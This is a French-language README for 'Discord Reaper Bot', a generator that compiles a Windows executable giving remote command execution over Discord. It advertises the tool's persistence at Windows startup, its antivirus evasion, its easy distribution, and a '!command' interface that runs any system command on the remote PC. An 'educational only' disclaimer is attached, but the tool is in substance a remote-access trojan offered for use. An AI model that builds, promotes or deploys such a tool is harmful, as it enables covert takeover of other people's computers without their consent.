
# 💻 **Discord Reaper Bot** 🤖

**Discord Reaper Bot** est un outil puissant qui permet de contrôler à distance un PC via Discord. Une fois configuré, il peut être lancé automatiquement au démarrage du système et exécuter des commandes depuis Discord en toute simplicité.

## 🔥 **Avantages** 🚀

- **Facilité d'utilisation** : Créez un bot Discord qui peut exécuter n'importe quelle commande système via Discord. 👨‍💻
- **Démarrage automatique** : Ajoutez votre programme au démarrage de Windows, afin qu'il s'exécute automatiquement à chaque reboot du PC. 🔄
- **Invisible pour les antivirus** 🦠 : Le fichier généré est conçu pour ne pas être détecté par les antivirus traditionnels.
- **Permissions maximales** : Le bot utilise toutes les permissions nécessaires pour contrôler et interagir avec Discord. ✅
- **Portable** : Le bot est compilé en un fichier exécutable `.exe`, facile à distribuer et exécuter.



## 🛠️ **Installation & Utilisation** ⚙️

### 1️⃣ Prérequis

Avant de commencer, assurez-vous d'avoir Python et `pip` installés sur votre machine. Vous aurez également besoin de `requests` et de `discord.py`.

Dans le terminal, installez les dépendances :

```bash
pip install -r requirements.txt
```

### 2️⃣ Générer votre fichier exécutable

Clonez ce dépôt et exécutez le script pour générer le bot Discord et l'exécutable `.exe`.

```bash
python votre_script.py
```

Lors de l'exécution, le script vous demandera :

- **BOT TOKEN** : Entrez le token de votre bot Discord.
- **FILE NAME** : Choisissez un nom pour le fichier `.py` qui sera généré.

Le bot sera compilé en un fichier `.exe` dans le dossier `dist`.

### 3️⃣ Lancer le bot Discord

Une fois que l'exécutable est généré, vous pouvez l'ouvrir. Il s'ajoutera automatiquement au démarrage de Windows pour que le bot fonctionne sans intervention. 🚀

---

## 🔧 **Commandes du Bot** 📝

- **!command <commande>** : Exécute une commande système sur le PC distant. 

Exemple :
```
!command echo Hello World
```

---

## 🌟 **Générer un lien d'invitation pour votre bot** 🔗

Le bot vous génère un lien d'invitation pour l'ajouter à vos serveurs Discord avec toutes les permissions maximales.

Exemple de lien d'invitation généré :
```
https://discord.com/oauth2/authorize?client_id=<BOT_ID>&permissions=8&scope=bot
```

---

## 🚨 **Important** ⚠️

- Ce bot est destiné à des fins éducatives uniquement. L'utilisation de ce script à des fins malveillantes ou non éthiques est strictement interdite.
- Il est essentiel de respecter la **légalité** et la **vie privée** des autres utilisateurs. 🚫
  
---

## 📄 **Licence** 📝

Ce projet est sous la licence **CC BY-NC-ND 4.0**. Vous êtes libre d'utiliser ce code, mais vous ne pouvez pas le modifier ni l'utiliser à des fins commerciales sans autorisation.

---

## 📢 **Support** 🤝

Si vous avez des questions ou des problèmes avec l'utilisation du bot, n'hésitez pas à ouvrir un **issue** ou à me contacter directement !

---

**Créez, personnalisez et contrôlez à distance vos machines avec Discord Reaper Bot !** 🔥
```

